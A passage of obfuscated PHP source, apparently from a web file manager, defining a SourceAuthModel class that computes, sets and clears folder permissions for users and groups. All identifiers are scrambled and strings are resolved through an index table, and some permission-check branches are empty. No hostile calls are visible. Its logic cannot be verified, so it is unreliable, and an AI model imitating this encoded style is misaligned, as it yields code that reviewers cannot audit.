array($ßÆµŞÑ²[7], $¬Šö¾óû), $ßÆµŞÑ²[562] => 1); $ßÏÌÎ¢· = $this->where($ÀÖÀ¤§)->field($ßÆµŞÑ²[665])->select(); if (empty($ßÏÌÎ¢·)) { return; } $’ñç¶Ğ = array_to_keyvalue($ßÏÌÎ¢·, $ßÆµŞÑ²[12], $ßÆµŞÑ²[665]); $this->remove($’ñç¶Ğ); } private function shareFileMeta($¡áµŒ™•, $î§¿Çô = null) { $¼ûáğÒ« =& $_SERVER[²Ö÷öõ]; $ª‰âÒŠŞ = array($¼ûáğÒ«[541] => $¡áµŒ™•, $¼ûáğÒ«[97] => $¼ûáğÒ«[2163]); if (is_null($î§¿Çô)) { return Model($¼ûáğÒ«[2164])->where($ª‰âÒŠŞ)->find(); } $ª‰âÒŠŞ[$¼ûáğÒ«[450]] = $î§¿Çô; Model($¼ûáğÒ«[2164])->add($ª‰âÒŠŞ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\x6f\x75\162\143\x65\x5f\141\165\x74\x68"; public function getAuth($€İç‘ÈŞ) { $ûƒÎäĞ— =& $_SERVER[²Ö÷öõ]; $ä¢ù€œÔ = $this->sourceAuthSelect($€İç‘ÈŞ); $´Õó³¬ğ = array(); $ƒĞ¹²û¤ = array(); $³ÁœñÔ = 2 << 25; foreach ($ä¢ù€œÔ as $…ö°ãÒÈ) { $™Îé¿Ì§ = Model($ûƒÎäĞ—[571])->listData($…ö°ãÒÈ[$ûƒÎäĞ—[2088]]); if (!$™Îé¿Ì§) { continue; } $´Õó³¬ğ[] = $…ö°ãÒÈ; $Ş¦Ëí•Ş = 0; if ($…ö°ãÒÈ[$ûƒÎäĞ—[190]] == SourceModel::TYPE_GROUP) { $Ş¦Ëí•Ş = $³ÁœñÔ * 2; } if ($…ö°ãÒÈ[$ûƒÎäĞ—[190]] == SourceModel::TYPE_USER) { $Ş¦Ëí•Ş = $³ÁœñÔ; } if ($…ö°ãÒÈ[$ûƒÎäĞ—[190]] == SourceModel::TYPE_USER && $…ö°ãÒÈ[$ûƒÎäĞ—[569]] == $ûƒÎäĞ—[228]) { $Ş¦Ëí•Ş = 0; } $ƒĞ¹²û¤[] = $™Îé¿Ì§[$ûƒÎäĞ—[487]] + $Ş¦Ëí•Ş; } array_multisort($ƒĞ¹²û¤, SORT_DESC, $´Õó³¬ğ); return $´Õó³¬ğ; } public function sourceAuthSelect($ªÇé‹Åˆ) { $²–¹»– =& $_SERVER[²Ö÷öõ]; static $¤Á²ÇÌ = array(); $Â†œÍŸÌ = is_array($ªÇé‹Åˆ) ? !1 : !0; if ($Â†œÍŸÌ) { $ªÇé‹Åˆ = array($ªÇé‹Åˆ); } $ëëî¾´å = array(); foreach ($ªÇé‹Åˆ as $¿Üô‘èı) { if (isset($¤Á²ÇÌ[$¿Üô‘èı])) { $ëëî¾´å[$¿Üô‘èı] = $¤Á²ÇÌ[$¿Üô‘èı]; } } if (count($ëëî¾´å) == count($ªÇé‹Åˆ)) { return $Â†œÍŸÌ ? $ëëî¾´å[$ªÇé‹Åˆ[0]] : $ëëî¾´å; } $Óëã ® = $²–¹»–[2165]; $‹¾äÀ°Ü = array($²–¹»–[193] => array($²–¹»–[7], $ªÇé‹Åˆ)); $¼â®˜ÕÓ = $this->field($Óëã ®)->order($²–¹»–[475])->where($‹¾äÀ°Ü)->select(); $Îëü¹òÀ = array_to_keyvalue_group($¼â®˜ÕÓ, $²–¹»–[193]); foreach ($ªÇé‹Åˆ as $¿Üô‘èı) { $¤Á²ÇÌ[$¿Üô‘èı] = $Îëü¹òÀ[$¿Üô‘èı] ? $Îëü¹òÀ[$¿Üô‘èı] : array(); } if ($Â†œÍŸÌ) { return $¼â®˜ÕÓ; } return $Îëü¹òÀ; } public function setAuth($ñûıŞ‰, $„ñıÕİï) { $ªÃ‡¿‚‘ =& $_SERVER[²Ö÷öõ]; $Î·ìÏ“… = Model($ªÃ‡¿‚‘[1428])->sourceInfo($ñûıŞ‰); if (!$Î·ìÏ“…) { return !1; } if ($Î·ìÏ“…[$ªÃ‡¿‚‘[190]] != SourceModel::TYPE_GROUP) { return !1; } $“ÃÃ¦‘ = 1; $‘Íù…Ö× = $Î·ìÏ“…[$ªÃ‡¿‚‘[569]]; if ($‘Íù…Ö× != $“ÃÃ¦‘) { $º§¼ğÜê = array($ªÃ‡¿‚‘[1980] => $‘Íù…Ö×); $Œê´îè´ = Model($ªÃ‡¿‚‘[2074])->field($ªÃ‡¿‚‘[1780])->where($º§¼ğÜê)->select(); $Œê´îè´ = array_to_keyvalue($Œê´îè´, $ªÃ‡¿‚‘[12], $ªÃ‡¿‚‘[1780]); } $’éç›¯ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $†Ø‹µ = array(); foreach ($„ñıÕİï as $òäØ¥¥Ü) { if (!in_array($òäØ¥¥Ü[$ªÃ‡¿‚‘[190]], $’éç›¯)) { show_json(LNG($ªÃ‡¿‚‘[2166]), !1); } if ($‘Íù…Ö× != $“ÃÃ¦‘) { if ($òäØ¥¥Ü[$ªÃ‡¿‚‘[190]] == SourceModel::TYPE_GROUP) { } if ($òäØ¥¥Ü[$ªÃ‡¿‚‘[569]] != 0 && !in_array($òäØ¥¥Ü[$ªÃ‡¿‚‘[569]], $Œê´îè´)) { } } if ($òäØ¥¥Ü[$ªÃ‡¿‚‘[569]] == 0) { $òäØ¥¥Ü[$ªÃ‡¿‚‘[190]] = SourceModel::TYPE_USER; } $†Ø‹µ[] = array($ªÃ‡¿‚‘[193] => $ñûıŞ‰, $ªÃ‡¿‚‘[190] => intval($òäØ¥¥Ü[$ªÃ‡¿‚‘[190]]), $ªÃ‡¿‚‘[569] => intval($òäØ¥¥Ü[$ªÃ‡¿‚‘[569]]), $ªÃ‡¿‚‘[2088] => intval($òäØ¥¥Ü[$ªÃ‡¿‚‘[2088]]) ? intval($òäØ¥¥Ü[$ªÃ‡¿‚‘[2088]]) : 0, $ªÃ‡¿‚‘[2148] => intval($òäØ¥¥Ü[$ªÃ‡¿‚‘[2148]]) ? intval($òäØ¥¥Ü[$ªÃ‡¿‚‘[2148]]) : -1); } $this->where(array($ªÃ‡¿‚‘[491] => $ñûıŞ‰))->delete(); $this->addAll($†Ø‹µ); return !0; } public function authClear($‹…•àšå) { $’Ç­¶ø… =& $_SERVER[²Ö÷öõ]; $øƒïü©ò = Model($’Ç­¶ø…[1428])->sourceInfo($‹…•àšå); $‰ÑÓ¨™ = array($‹…•àšå); if ($øƒïü©ò[$’Ç­¶ø…[485]] == $’Ç­¶ø…[91]) { $ìçòÖ‹« = array($’Ç­¶ø…[652] => array($’Ç­¶ø…[612], $øƒïü©ò[$’Ç­¶ø…[584]] . $‹…•àšå . $’Ç­¶ø…[613])); $‰ÑÓ¨™ = Model($’Ç­¶ø…[1428])->field($’Ç­¶ø…[491])->where($ìçòÖ‹«)->getField($’Ç­¶ø…[193], !0); $‰ÑÓ¨™[] = $‹…•àšå; } $this->where(array($’Ç­¶ø…[491] => array($’Ç­¶ø…[492], $‰ÑÓ¨™)))->delete(); return !0; } public function getAllChildren($ã‘íåºÓ) { $¾¬ÁˆÃË =& $_SERVER[²Ö÷öõ]; $æãæÛÁ€ = Model($¾¬ÁˆÃË[1428])->sourceInfo($ã‘íåºÓ); if ($æãæÛÁ€[$¾¬ÁˆÃË[485]] != $¾¬ÁˆÃË[91]) { return $this->sourceListAuth(array($ã‘íåºÓ)); } if ($æãæÛÁ€[$¾¬ÁˆÃË[190]] != SourceModel::TYPE_GROUP) { return array(); } $Üˆ†Ğ’ˆ = 1; $š˜ƒ¤– = array($ã‘íåºÓ); if ($æãæÛÁ€[$¾¬ÁˆÃË[192]] == $¾¬ÁˆÃË[228] && $æãæÛÁ€[$¾¬ÁˆÃË[569]] != $Üˆ†Ğ’ˆ) { $š˜ƒ¤– = $this->groupChidldAllRootSource($æãæÛÁ€[$¾¬ÁˆÃË[569]]); } $½ºßò„ = $this->field($¾¬ÁˆÃË[193])->group($¾¬ÁˆÃË[193])->select(); $½ºßò„ = array_to_keyvalue($½ºßò„, $¾¬ÁˆÃË[12], $¾¬ÁˆÃË[193]); if (!$½ºßò„) { return array(); } $òÌË»¸ª = $¾¬ÁˆÃË[2167]; $«ÓşìÔ€ = array($¾¬ÁˆÃË[193] => array($¾¬ÁˆÃË[7], $½ºßò„), $¾¬ÁˆÃË[505] => $¾¬ÁˆÃË[228]); $ã»ñŞËã = Model($¾¬ÁˆÃË[907])->field($òÌË»¸ª)->where($«ÓşìÔ€)->select(); $ëĞÎÑòĞ = array($ã‘íåºÓ); foreach ($ã»ñŞËã as $®‘µ­“š) { foreach ($š˜ƒ¤– as $¶ÜŸ˜Æ‹) { $ªß§ÓÄ— = $¾¬ÁˆÃË[50] . $¶ÜŸ˜Æ‹ . $¾¬ÁˆÃË[50]; $şğëš‹¥ = $®‘µ­“š[$¾¬ÁˆÃË[584]] . $®‘µ­“š[$¾¬ÁˆÃË[193]] . $¾¬ÁˆÃË[50]; if (strstr($şğëš‹¥, $ªß§ÓÄ—)) { $ëĞÎÑòĞ[] = $®‘µ­“š[$¾¬ÁˆÃË[193]]; break; } } } return $this->sourceListAuth($ëĞÎÑòĞ); } private function sourceListAuth($’’Ñ×š‡) { $ŠÄ»Š­ó =& $_SERVER[²Ö÷öõ]; $–¥€¶¹ = Model($ŠÄ»Š­ó[1428])->sourceListInfo($’’Ñ×š‡, !0); $Ôàê®½ = $this->sourceAuthSelect($’’Ñ×š‡); $³å’üéº = array(); $©ã€ê‘ = array(); foreach ($–¥€¶¹ as $ù¬¬›ú¸) { unset($ù¬¬›ú¸[$ŠÄ»Š­ó[529]]); unset($ù¬¬›ú¸[$ŠÄ»Š­ó[527]]); unset($ù¬¬›ú¸[$ŠÄ»Š­ó[487]]); unset($ù¬¬›ú¸[$ŠÄ»Š­ó[90]]); $ŒÚàµº¶ = $Ôàê®½[$ù¬¬›ú¸[$ŠÄ»Š­ó[193]]]; if (!$ŒÚàµº¶) { continue; } $ù¬¬›ú¸[$ŠÄ»Š­ó[2168]] = $this->authTargetInfo($ŒÚàµº¶); $ù¬¬›ú¸[$ŠÄ»Š­ó[582]] = rtrim($ù¬¬›ú¸[$ŠÄ»Š­ó[588]], $ŠÄ»Š­ó[8]) . $ŠÄ»Š­ó[8] . ltrim($ù¬¬›ú¸[$ŠÄ»Š­ó[582]], $ŠÄ»Š­ó[8]); $³å’üéº[] = $ù¬¬›ú¸; $”œÄ¢¿æ = count(explode($ŠÄ»Š­ó[8], trim($ù¬¬›ú¸[$ŠÄ»Š­ó[582]], $ŠÄ»Š­ó[8]))); $©ã€ê‘[] = $”œÄ¢¿æ + ($ù¬¬›ú¸[$ŠÄ»Š­ó[33]] == $ŠÄ»Š­ó[78] ? 0 : 1000); } array_multisort($©ã€ê‘, SORT_ASC, $³å’üéº); return $³å’üéº; } private function groupChidldAllRootSource($–ã‰ûÊ’) { $¥Ìƒ ­ =& $_SERVER[²Ö÷öõ]; $²ÙôøçÀ = Model($¥Ìƒ ­[2169])->groupChildrenAll($–ã‰ûÊ’); $ª™ÂµÎ = array($¥Ìƒ ­[192] => 0, $¥Ìƒ ­[569] => array($¥Ìƒ ­[7], $²ÙôøçÀ), $¥Ìƒ ­[190] => SourceModel::TYPE_GROUP); $£ÃÏâ‰’ = Model($¥Ìƒ ­[907])->field($¥Ìƒ ­[193])->where($ª™ÂµÎ)->select(); $£ÃÏâ‰’ = array_to_keyvalue($£ÃÏâ‰’, $¥Ìƒ ­[12], $¥Ìƒ ­[193]); return $£ÃÏâ‰’; } private function authTargetInfo($‚˜»£Ñü) { $»Ğ„¡¯ =& $_SERVER[²Ö÷öõ]; $¾¡çãÄ… = array(); $®Ñë‚« = array(); $ñ“ºŠ  = 2 << 25; foreach ($‚˜»£Ñü as $®Ÿª•Ü) { $†Ä¿´œ‰ = Model($»Ğ„¡¯[571])->listData($®Ÿª•Ü[$»Ğ„¡¯[2088]]); if (!$†Ä¿´œ‰) { continue; } if ($®Ÿª•Ü[$»Ğ„¡¯[190]] == SourceModel::TYPE_USER) { $÷âÔí· = Model($»Ğ„¡¯[577])->getInfoSimpleOuter($®Ÿª•Ü[$»Ğ„¡¯[569]]); if ($÷âÔí·[$»Ğ„¡¯[1780]] == $»Ğ„¡¯[1281]) { continue; } if ($÷âÔí·[$»Ğ„¡¯[1780]] == $»Ğ„¡¯[228]) { $÷âÔí·[$»Ğ„¡¯[32]] = LNG($»Ğ„¡¯[2170]); } } else { $÷âÔí· = Model($»Ğ„¡¯[585])->getInfoSimple($®Ÿª•Ü[$»Ğ„¡¯[569]]); } if (!$÷âÔí·) { continue; } $÷âÔí·[$»Ğ„¡¯[540]] = $†Ä¿´œ‰; $¾¡çãÄ…[] = $÷âÔí·; $ŒÒÛ¾íÚ = 0; if ($®Ÿª•Ü[$»Ğ„¡¯[190]] == SourceModel::TYPE_GROUP) { $ŒÒÛ¾íÚ = $ñ“ºŠ  * 2; } if ($®Ÿª•Ü[$»Ğ„¡¯[190]] == SourceModel::TYPE_USER) { $ŒÒÛ¾íÚ = $ñ“ºŠ ; } if ($®Ÿª•Ü[$»Ğ„¡¯[190]] == SourceModel::TYPE_USER && $®Ÿª•Ü[$»Ğ„¡¯[569]] == $»Ğ„¡¯[228]) { $ŒÒÛ¾íÚ = 0; } $®Ñë‚«[] = $†Ä¿´œ‰[$»Ğ„¡¯[487]] + $ŒÒÛ¾íÚ; } array_multisort($®Ñë‚«, SORT_DESC, $¾¡çãÄ…); return $¾¡çãÄ…; } public function getAllChildrenByUser($‡ØÀ¼Ò, $ë«ßğ´¸) { $£‘ä©¦± =& $_SERVER[²Ö÷öõ]; $Ó¾ŸıÆˆ = Model($£‘ä©¦±[598])->getInfo($ë«ßğ´¸); if (!$ë«ßğ´¸ || !$‡ØÀ¼Ò || !$Ó¾ŸıÆˆ) { return array(); } $ğ±ô¿‚Ù = Model($£‘ä©¦±[1428])->sourceInfo($‡ØÀ¼Ò); $å´à‡é = array(); $ÜĞˆ¡í = 1; if ($ğ±ô¿‚Ù[$£‘ä©¦±[192]] == $£‘ä©¦±[228] && $ğ±ô¿‚Ù[$£‘ä©¦±[569]] != $ÜĞˆ¡í && $this->groupContainUser($ğ±ô¿‚Ù[$£‘ä©¦±[569]], $ë«ßğ´¸)) { foreach ($Ó¾ŸıÆˆ[$£‘ä©¦±[2171]] as $€¦µ“„) { $¾‹ïÔÂ€ = Model($£‘ä©¦±[585])->getInfo($€¦µ“„[$£‘ä©¦±[1980]]); $æŞŸÔ”ß = Model($£‘ä©¦±[598])->getInfoSimpleOuter($ë«ßğ´¸); $æŞŸÔ”ß[$£‘ä©¦±[540]] = $€¦µ“„[$£‘ä©¦±[487]]; if (Model($£‘ä©¦±[571])->authCheckAction($€¦µ“„[$£‘ä©¦±[487]][$£‘ä©¦±[487]], $£‘ä©¦±[2001])) { continue; } $ËŞ×¾åÆ = array($£‘ä©¦±[32] => $£‘ä©¦±[1301] . $¾‹ïÔÂ€[$£‘ä©¦±[32]], $£‘ä©¦±[193] => $¾‹ïÔÂ€[$£‘ä©¦±[90]][$£‘ä©¦±[193]], $£‘ä©¦±[87] => KodIO::make($¾‹ïÔÂ€[$£‘ä©¦±[90]][$£‘ä©¦±[193]]), $£‘ä©¦±[192] => $£‘ä©¦±[228], $£‘ä©¦±[190] => $£‘ä©¦±[578], $£‘ä©¦±[33] => $£‘ä©¦±[616], $£‘ä©¦±[582] => $¾‹ïÔÂ€[$£‘ä©¦±[589]], $£‘ä©¦±[1980] => $¾‹ïÔÂ€[$£‘ä©¦±[1980]], $£‘ä©¦±[586] => $¾‹ïÔÂ€[$£‘ä©¦±[192]], $£‘ä©¦±[2168] => array($æŞŸÔ”ß)); $å´à‡é[$ËŞ×¾åÆ[$£‘ä©¦±[193]]] = $ËŞ×¾åÆ; } } $á½Üí©û = array(); $Àşßƒ´ì = $this->getAllChildren($‡ØÀ¼Ò); foreach ($Àşßƒ´ì as $Š˜ĞÈöÓ) { $—ş¶º´± = !1; foreach ($Š˜ĞÈöÓ[$£‘ä©¦±[2168]] as $¸ŞØ¢½Ô) { if ($¸ŞØ¢½Ô[$£‘ä©¦±[1780]]) { if ($¸ŞØ¢½Ô[$£‘ä©¦±[1780]] == $ë«ßğ´¸) { $—ş¶º´± = !0; break; } } if ($¸ŞØ¢½Ô[$£‘ä©¦±[1980]]) { if ($this->groupContainUser($¸ŞØ¢½Ô[$£‘ä©¦±[1980]], $ë«ßğ´¸)) { $—ş¶º´± = !0; break; } } } if ($—ş¶º´±) { $á½Üí©û[] = $Š˜ĞÈöÓ; } $Û¨˜æóı = $Š˜ĞÈöÓ[$£‘ä©¦±[193]]; if (isset($å´à‡é[$Û¨˜æóı])) { $Š˜ĞÈöÓ[$£‘ä©¦±[2168]][] = $å´à‡é[$Û¨˜æóı][0]; $å´à‡é[$Û¨˜æóı] = !1; } } $å´à‡é = array_filter(array_values($å´à‡é)); $á½Üí©û = array_merge($å´à‡é, $á½Üí©û); return $á½Üí©û; } public function setAllChildrenByUser($áŸˆŠ¶«, $ì†ÄÅ’ö, $‘éÆÆ¦Û) { $¢×®„Ç› =& $_SERVER[²Ö÷öõ]; $Ã€‹£’î = $this->getAllChildrenByUser($áŸˆŠ¶«, $ì†ÄÅ’ö); if (!$‘éÆÆ¦Û || !$Ã€‹£’î) { return !1; } foreach ($Ã€‹£’î as $­ãÍó†â) { $­¸µ“õ = array(); foreach ($­ãÍó†â[$¢×®„Ç›[2168]] as $›ò˜…Áü) { $Ì«ü  ‰ = $›ò˜…Áü[$¢×®„Ç›[540]]; $ğ¡Ü š„ = $›ò˜…Áü[$¢×®„Ç›[1780]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ú¤Õ®° = $›ò˜…Áü[$¢×®„Ç›[1780]] ? $›ò˜…Áü[$¢×®„Ç›[1780]] : $›ò˜…Áü[$¢×®„Ç›[1980]]; if ($›ò˜…Áü[$¢×®„Ç›[1780]] && $›ò˜…Áü[$¢×®„Ç›[1780]] == $ì†ÄÅ’ö) { continue; } $­¸µ“õ[] = array($¢×®„Ç›[193] => $­ãÍó†â[$¢×®„Ç›[193]], $¢×®„Ç›[190] => $ğ¡Ü š„, $¢×®„Ç›[569] => intval($ú¤Õ®°), $¢×®„Ç›[2088] => isset($Ì«ü  ‰[$¢×®„Ç›[475]]) ? intval($Ì«ü  ‰[$¢×®„Ç›[475]]) : 0, $¢×®„Ç›[2148] => isset($Ì«ü  ‰[$¢×®„Ç›[2148]]) ? intval($Ì«ü  ‰[$¢×®„Ç›[2148]]) : -1); } $­¸µ“õ[] = array($¢×®„Ç›[193] => $­ãÍó†â[$¢×®„Ç›[193]], $¢×®„Ç›[190] => SourceModel::TYPE_USER, $¢×®„Ç›[569] => intval($ì†ÄÅ’ö), $¢×®„Ç›[2088] => intval($‘éÆÆ¦Û), $¢×®„Ç›[2148] => -1); $this->where(array($¢×®„Ç›[491] => $­ãÍó†â[$¢×®„Ç›[193]]))->delete(); $this->addAll($­¸µ“õ); } return !0; } public function get($ÌÊ­Áª ) { $™à­™ıÎ = $this->getSourceList(array($ÌÊ­Áª ), !0); return $™à­™ıÎ[0]; } public function getSourceList($Õ³éÁä, $¦èª·ôë = false, $¡ŞÊÀÑÏ = false) { $´üş‹«™ =& $_SERVER[²Ö÷öõ]; if (!$Õ³éÁä) { return array(); } $ˆ¬õ™¸ø = Model($´üş‹«™[1428]); if (!$¦èª·ôë && count($Õ³éÁä) == 1) { $¦èª·ôë = array(); $¦èª·ôë[$Õ³éÁä[0]] = $ˆ¬õ™¸ø->sourceInfo($Õ³éÁä[0]); } if (!$¦èª·ôë) { $ËÎÎ–Óà = array($´üş‹«™[491] => array($´üş‹«™[492], $Õ³éÁä)); $¦èª·ôë = $ˆ¬õ™¸ø->field($´üş‹«™[2172])->where($ËÎÎ–Óà)->select(); $¦èª·ôë = array_to_keyvalue($¦èª·ôë, $´üş‹«™[193]); } $Ó¥‚‘î = $Õ³éÁä; foreach ($¦èª·ôë as $ôØ®ÒÊè => $•È»Ÿ·) { $¾º’Ò€· = $ˆ¬õ™¸ø->parentLevelArray($•È»Ÿ·[$´üş‹«™[584]]); $Ó¥‚‘î = array_merge($Ó¥‚‘î, array($ôØ®ÒÊè), array_reverse($¾º’Ò€·)); } $Ó¥‚‘î = array_values(array_unique($Ó¥‚‘î)); if (!$Ó¥‚‘î) { return array(); } $ñÓ²É­ = $this->sourceAuthSelect($Ó¥‚‘î); $şöğæ‡¬ = array(); foreach ($Ó¥‚‘î as $Ò…ô³ˆ) { if (isset($ñÓ²É­[$Ò…ô³ˆ])) { $şöğæ‡¬[$Ò…ô³ˆ] = $ñÓ²É­[$Ò…ô³ˆ]; } } $üí¢ë‡ñ = $this->userIsRoot($¡ŞÊÀÑÏ); $¶·¯¦Ü = AuthModel::authAll(); $¸ªãº¹ò = array($´üş‹«™[488] => $¶·¯¦Ü, $´üş‹«™[2173] => array($´üş‹«™[493] => 0, $´üş‹«™[1986] => $¶·¯¦Ü, $´üş‹«™[494] => LNG($´üş‹«™[2174]), $´üş‹«™[2003] => $´üş‹«™[2175])); $Ÿ‘ĞŒ¥Â = array(); foreach ($¦èª·ôë as $Ò…ô³ˆ => $•¸Ë»¢) { if ($üí¢ë‡ñ && $GLOBALS[$´üş‹«™[6]][$´üş‹«™[1999]]) { $Ÿ‘ĞŒ¥Â[$Ò…ô³ˆ] = $¸ªãº¹ò; continue; } $Ÿ‘ĞŒ¥Â[$Ò…ô³ˆ] = $this->makeSourceAuth($•¸Ë»¢, $şöğæ‡¬, $¡ŞÊÀÑÏ); } return $Ÿ‘ĞŒ¥Â; } public function authDeepCheck($ïÎ²“†Ù, $±´¢ƒò‘ = false) { $¢ˆÔÇÒ‘ =& $_SERVER[²Ö÷öõ]; $±´¢ƒò‘ = $±´¢ƒò‘ ? $±´¢ƒò‘ : USER_ID; $èİÉ™şü = $this->makeAuthDeep($±´¢ƒò‘); if (!in_array($ïÎ²“†Ù, $èİÉ™şü[$¢ˆÔÇÒ‘[2176]])) { return !1; } $ÛÖº¤Ñ« = array(); foreach ($èİÉ™şü[$¢ˆÔÇÒ‘[2177]] as $ğÎ´†ôÔ => $‘Å’¡›) { if (!in_array($ïÎ²“†Ù, $‘Å’¡›)) { continue; } $ÛÖº¤Ñ«[] = $ğÎ´†ôÔ; } if (!$ÛÖº¤Ñ«) { return !1; } $õà•úÔ¶ = $ÛÖº¤Ñ« ? $ÛÖº¤Ñ«[0] : $ïÎ²“†Ù; return array($¢ˆÔÇÒ‘[488] => -1, $¢ˆÔÇÒ‘[540] => array($¢ˆÔÇÒ‘[493] => $¢ˆÔÇÒ‘[1281], $¢ˆÔÇÒ‘[1986] => $¢ˆÔÇÒ‘[228], $¢ˆÔÇÒ‘[494] => LNG($¢ˆÔÇÒ‘[2178]), $¢ˆÔÇÒ‘[2003] => $¢ˆÔÇÒ‘[2179]), $¢ˆÔÇÒ‘[2180] => LNG($¢ˆÔÇÒ‘[2181]), $¢ˆÔÇÒ‘[2182] => $this->sourceAuthInfo($õà•úÔ¶)); } protected function makeAuthDeep($éïŠø£¦ = false) { $ñ×ş´ì‰ =& $_SERVER[²Ö÷öõ]; static $¶¬¶Ä¾ë = array(); $éïŠø£¦ = $éïŠø£¦ ? $éïŠø£¦ : USER_ID; if (isset($¶¬¶Ä¾ë[$éïŠø£¦])) { return $¶¬¶Ä¾ë[$éïŠø£¦]; } $ÈñØÏ²Ö = Model($ñ×ş´ì‰[2183])->listData(); $—…Âì‚ì = array(); foreach ($ÈñØÏ²Ö as $İ³‚Ë¦) { if ($İ³‚Ë¦[$ñ×ş´ì‰[487]] == 0 && $İ³‚Ë¦[$ñ×ş´ì‰[2002]] == $ñ×ş´ì‰[91]) { $—…Âì‚ì[] = $İ³‚Ë¦[$ñ×ş´ì‰[475]]; } } $îÖÂ¬…³ = $this->userGroupParents($éïŠø£¦); $ë­„Àà = array($ñ×ş´ì‰[190] => SourceModel::TYPE_USER, $ñ×ş´ì‰[569] => $éïŠø£¦); if ($îÖÂ¬…³) { $ë­„Àà = array(array($ñ×ş´ì‰[190] => SourceModel::TYPE_USER, $ñ×ş´ì‰[569] => $éïŠø£¦), array($ñ×ş´ì‰[190] => SourceModel::TYPE_GROUP, $ñ×ş´ì‰[569] => array($ñ×ş´ì‰[492], $îÖÂ¬…³)), $ñ×ş´ì‰[1086] => $ñ×ş´ì‰[2082]); } $êå‰şØõ = $this->field($ñ×ş´ì‰[2184])->where($ë­„Àà)->select(); $î¨Íîä² = array(); $â±¸ŠÅ˜ = array_to_keyvalue_group($êå‰şØõ, $ñ×ş´ì‰[193]); foreach ($â±¸ŠÅ˜ as $¢¨ä§ŒÍ => $Ù°Ãó¦Î) { $¥¦œÁôÎ = $this->authArrayCheck($Ù°Ãó¦Î, $éïŠø£¦); if ($¥¦œÁôÎ[$ñ×ş´ì‰[488]] > 0) { $î¨Íîä²[] = $¢¨ä§ŒÍ . $ñ×ş´ì‰[12]; } } if ($îÖÂ¬…³) { $ËÍ§¡Ç = Model($ñ×ş´ì‰[585]); foreach ($îÖÂ¬…³ as $›ô„÷‚) { $‰‰ùÍÅÊ = $ËÍ§¡Ç->getInfo($›ô„÷‚); if (!$‰‰ùÍÅÊ || !is_array($‰‰ùÍÅÊ[$ñ×ş´ì‰[90]])) { continue; } $î¨Íîä²[] = $‰‰ùÍÅÊ[$ñ×ş´ì‰[90]][$ñ×ş´ì‰[193]]; } } $ÌÃËÊ‘Ï = array(); $Ãµß‘Æ´ = $îÖÂ¬…³; $ÍÆµâºú = Model($ñ×ş´ì‰[1428]); $ËÍ§¡Ç = Model($ñ×ş´ì‰[585]); $ã”ö‡  = array(); $†Š‰«¯§ = array(); $ã÷ÊÄ = array(); $Ã“ÍÄçù = array(); if ($î¨Íîä²) { $îœÈÙ»¨ = $ÍÆµâºú->where(array($ñ×ş´ì‰[193] => array($ñ×ş´ì‰[492], $î¨Íîä²)))->select(); foreach ($îœÈÙ»¨ as $åÕ‘¤™ä) { $«Íšäì© = $ÍÆµâºú->parentLevelArray($åÕ‘¤™ä[$ñ×ş´ì‰[584]]); $ÌÃËÊ‘Ï = array_merge($ÌÃËÊ‘Ï, $«Íšäì©); $Ãµß‘Æ´[] = $åÕ‘¤™ä[$ñ×ş´ì‰[569]]; $ã”ö‡ [$åÕ‘¤™ä[$ñ×ş´ì‰[193]]] = $«Íšäì©; $†Š‰«¯§[$åÕ‘¤™ä[$ñ×ş´ì‰[193]]] = $åÕ‘¤™ä[$ñ×ş´ì‰[569]]; } } $Ãµß‘Æ´ = array_values(array_unique($Ãµß‘Æ´)); $¸ìºÑ   = $Ãµß‘Æ´; foreach ($¸ìºÑ   as $›ô„÷‚) { $‰‰ùÍÅÊ = $ËÍ§¡Ç->getInfo($›ô„÷‚); $«Íšäì© = $ÍÆµâºú->parentLevelArray($‰‰ùÍÅÊ[$ñ×ş´ì‰[584]]); $Ãµß‘Æ´ = array_merge($Ãµß‘Æ´, $«Íšäì©); } $Ãµß‘Æ´ = array_values(array_unique($Ãµß‘Æ´)); foreach ($Ãµß‘Æ´ as $›ô„÷‚) { $‰‰ùÍÅÊ = $ËÍ§¡Ç->getInfo($›ô„÷‚); $ÌÃËÊ‘Ï[] = $‰‰ùÍÅÊ[$ñ×ş´ì‰[90]][$ñ×ş´ì‰[193]]; $ã÷ÊÄ[$›ô„÷‚] = $‰‰ùÍÅÊ[$ñ×ş´ì‰[90]][$ñ×ş´ì‰[193]]; $Ã“ÍÄçù[$›ô„÷‚] = $ÍÆµâºú->parentLevelArray($‰‰ùÍÅÊ[$ñ×ş´ì‰[584]]); } foreach ($ã”ö‡  as $ê‘åŠ => $Ë´Ã°×) { $·ê×ıõ¡ = $†Š‰«¯§[$ê‘åŠ]; if (!$·ê×ıõ¡ || !$ã÷ÊÄ[$·ê×ıõ¡]) { continue; } $ıÓŞÃ‚ = array(); foreach ($Ã“ÍÄçù[$·ê×ıõ¡] as $›ô„÷‚) { $ıÓŞÃ‚[] = $ã÷ÊÄ[$›ô„÷‚]; } $ã”ö‡ [$ê‘åŠ] = array_merge($ıÓŞÃ‚, $Ë´Ã°×); } $ÌÃËÊ‘Ï = array_values(array_unique($ÌÃËÊ‘Ï)); $âÈñÂä› = array($ñ×ş´ì‰[2176] => $ÌÃËÊ‘Ï, $ñ×ş´ì‰[2177] => $ã”ö‡ ); $¶¬¶Ä¾ë[$éïŠø£¦] = $âÈñÂä›; return $âÈñÂä›; } private function makeSourceAuth($Ä¼¸ÏÏ“, $ØŒ°š™ª, $†ÄÉóÙ” = false) { $İÆ†ûÛ =& $_SERVER[²Ö÷öõ]; $ˆÓÃ½ = $İÆ†ûÛ[91]; $úË´ñÃÂ = $Ä¼¸ÏÏ“[$İÆ†ûÛ[569]]; $£ü—ÓƒÅ = $Ä¼¸ÏÏ“[$İÆ†ûÛ[190]] == SourceModel::TYPE_GROUP; $æ¹ë¡±£ = $£ü—ÓƒÅ ? $this->groupRootAuth($úË´ñÃÂ, $†ÄÉóÙ”) : !1; if ($æ¹ë¡±£ && Model($İÆ†ûÛ[571])->authCheckAction($æ¹ë¡±£[$İÆ†ûÛ[487]], $İÆ†ûÛ[2001])) { return $this->groupAuthInfo($æ¹ë¡±£, $úË´ñÃÂ); } $ÜôÄü¥˜ = Model($İÆ†ûÛ[1428])->parentLevelArray($Ä¼¸ÏÏ“[$İÆ†ûÛ[584]]); $ÜôÄü¥˜ = array_merge(array($Ä¼¸ÏÏ“[$İÆ†ûÛ[193]]), array_reverse($ÜôÄü¥˜)); $î–ÔòÈ® = !1; foreach ($ÜôÄü¥˜ 